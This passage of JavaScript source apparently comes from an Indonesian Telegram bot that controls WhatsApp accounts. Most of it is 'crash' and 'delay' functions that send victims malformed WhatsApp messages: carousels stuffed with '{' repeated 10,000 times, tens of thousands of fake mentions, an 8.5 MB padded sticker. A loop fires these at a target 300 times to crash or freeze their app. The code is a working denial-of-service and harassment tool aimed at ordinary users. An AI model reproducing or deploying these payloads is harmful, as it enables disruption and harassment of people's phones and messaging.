    return bot.sendMessage(chatId, "❌ *Fitur ini hanya untuk Owner atau SVIP*", {
      parse_mode: "Markdown",
    });
  }

  // Validasi input nomor
  const input = match?.[1]?.trim();
  if (!input) {
    return bot.sendMessage(chatId, "❗️Contoh penggunaan:\n`/addbot 62xxxxxxxxxx`", {
      parse_mode: "Markdown",
    });
  }

  const botNumber = input.replace(/[^0-9]/g, "");
  if (botNumber.length < 10 || botNumber.length > 15) {
    return bot.sendMessage(chatId, "❗️Nomor WhatsApp tidak valid!", {
      parse_mode: "Markdown",
    });
  }

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("❌ Error in /addbot:", error);
    return bot.sendMessage(chatId, `⚠️ Gagal menghubungkan:\n\`${error.message}\``, {
      parse_mode: "Markdown",
    });
  }
});

// Function CRASH Nya
async function CrlSqL(sock, isTarget) {
const cards = [];

const media = await prepareWAMessageMedia(
{ video: fs.readFileSync("./kebebasan.mp4") },
{ upload: sock.waUploadToServer }
);

const header = {
videoMessage: media.videoMessage,
hasMediaAttachment: false,
contextInfo: {
forwardingScore: 666,
isForwarded: true,
stanzaId: "FnX-" + Date.now(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedMessage: {
extendedTextMessage: {
text: "🧬⃟༑ —SASUKE CRASH KILL YOU🗡️🗡️",
contextInfo: {
mentionedJid: ["13135550002@s.whatsapp.net"],
externalAdReply: {
title: "sock AI Broadcast",
body: "Trusted System",
thumbnailUrl: "",
mediaType: 1,
sourceUrl: "https://tama.example.com",
showAdAttribution: false // trigger 1
}
}
}
}
}
};

for (let r = 0; r < 666; r++) {
cards.push({
header,
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000) // trigger 2
}
});
}

const msg = generateWAMessageFromContent(
isTarget,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: "—sock KILL YOU🗡️🎭"
},
carouselMessage: {
cards,
messageVersion: 1
},
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: "13135550002@s.whatsapp.net"
},
stanzaId: "FnX" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
forwardingScore: 100,
isForwarded: true,
mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
externalAdReply: {
title: "SASUKE CRASH🗡️🗡️",
body: "",
thumbnailUrl: "https://example.com/",
mediaType: 1,
mediaUrl: "",
sourceUrl: "https://finix-ai.example.com",
showAdAttribution: false
}
}
}
}
}
},
{}
);

await sock.relayMessage(isTarget, msg.message, {
participant: { jid: isTarget },
messageId: msg.key.id
});
}

async function oneMsgFC(sock, jid) {
  const sockUrl = 'https://files.catbox.moe/ncblg3.mp4';
  const video = await prepareWAMessageMedia(
    { video: { url: sockUrl } },
    { upload: sock.waUploadToServer }
  );

  const videoMessage = {
    videoMessage: video.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: String(Date.now()),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: [jid],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "sock KILL YOU🗡️🗡️",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  const cards = [];
  for (let i = 0; i < 10; i++) {
    cards.push({
      header: videoMessage,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "" },
          carouselMessage: {
            cards: cards,
            messageVersion: 1
          },
          contextInfo: {
            businessMessageForwardInfo: {
              businessOwnerJid: jid
            },
            stanzaId: String(Math.floor(Math.random() * 99999)),
            forwardingScore: 100,
            isForwarded: true,
            mentionedJid: [jid],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "SASUKE CRASHH🗡️🗡️",
              mediaType: 1,
              mediaUrl: "",
              sourceUrl: "sock Nh Deku",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  const message = generateWAMessageFromContent(jid, interactive, { quoted: nata });

  await sock.relayMessage(jid, message.message, {
    participant: { jid: jid },
    messageId: message.key.id
  });
}

// FUNC DELAY NYAA
async function KuotaHardXDelaySql(jid, sock, mention) {
  const parse = false;
  const SID = "5e03e0&mms3";
  const key = "10000000_2012297619515179_5714769099548640934_n.enc";
  const type = "image/webp";

  const generateMentionList = () => [
    "0@s.whatsapp.net",
    ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
  ];

  const stickerBase = {
    url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
    fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
    fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
    mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
    mimetype: type,
    directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
    fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
    mediaKeyTimestamp: { low: Date.now() % 2147483647, high: 0, unsigned: false },
    firstFrameLength: 19904,
    firstFrameSidecar: "KN4kQ5pyABRAgA==",
    isAnimated: true,
    isAvatar: parse,
    isAiSticker: parse,
    isLottie: parse,
    contextInfo: {
      participant: jid,
      mentionedJid: generateMentionList(),
      groupMentions: [],
      entryPointConversionSource: "non_contact",
      entryPointConversionApp: "whatsapp",
      entryPointConversionDelaySeconds: 467593
    },
    stickerSentTs: { low: Math.floor(Math.random() * -20000000), high: 555, unsigned: parse }
  };

  const bulldozerMsg = generateWAMessageFromContent(jid, {
    viewOnceMessage: { message: { stickerMessage: { ...stickerBase } } }
  }, {});

  const xmessage = generateWAMessageFromContent(jid, {
    buttonsResponseMessage: {
      selectedButtonId: "ោ៝".repeat(10000),
      selectedDisplayText: "SASUKE CRASH🗡️🗡️",
      contextInfo: {
        mentionedJid: generateMentionList(),
        quotedMessage: {
          message: {
            text: "sock",
            footer: "SASUKE CRASH🗡️",
            buttons: [{
              buttonId: "🚀",
              buttonText: { displayText: "~𑇂𑆵𑆴𑆿".repeat(5000) },
              type: 1
            }],
            headerType: 1,
            viewOnce: false
          }
        }
      },
      type: 1
    }
  }, {});

  const bulldozer5GB = generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          ...stickerBase,
          extraPayload: generateLargeString(8.5 * 1024 * 1024)
        }
      }
    }
  }, {});

  const hellboyHeader = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "Pelerrr",
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: -999.035,
              degreesLongitude: 922.999999999999,
              name: "socka",
              address: "CursedUltimate!"
            }
          },
          body: { text: "alay" },
          nativeFlowMessage: { messageParamsJson: "{".repeat(10000) },
          contextInfo: {
            participant: jid,
            mentionedJid: ["0@s.whatsapp.net"]
          }
        }
      }
    }
  };

  const delayImage = generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m231/AQPn2Q1-sS7Cpb3fgBHWZsCTeAZdl7eiwhsh3kKqCHUM0JdWo7IsDrKc3LvfjIME1CjgwrmmSNMAY3xWVXIcbyEvyEIiQzDN2SKxwjfZaA",
          mimetype: "image/jpeg",
          caption: "Prossesor delays your core",
          fileSha256: "P6KyebInzmPlARmsEBxlMW6kpea1xN4H8MRlrCwLmZM=",
          fileLength: "49695",
          height: 490,
          width: 735,
          mediaKey: "mDQEG3LOZc9r5dOMP+AB/nEjB534VQLR1Zp7zCCQj54=",
          fileEncSha256: "7hhoECd6a48mQjz1MH3rt9tnKi3fR8tilU1fPsgFUSw=",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD...",
          contextInfo: {
            mentionedJid: generateMentionList(),
            isSampled: false,
            participant: jid,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  }, {});

  const messages = [bulldozerMsg, xmessage, bulldozer5GB, hellboyHeader, delayImage];

  for (const msg of messages) {
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key?.id || null,
      statusJidList: [jid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: jid }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  }
}

// Fungsi pemanggilan Untuk Func Crash
async function BugPayloadCrash(sock, target) {
for (let i = 0; i < 300; i++) {
await CrlSqL(target, sock);
await CrlSqL(target, sock);
await oneMsgFC(target, sock);
await oneMsgFC(target, sock);
 }
}
// End  
  console.log(chalk.green(`Ape bende ni`));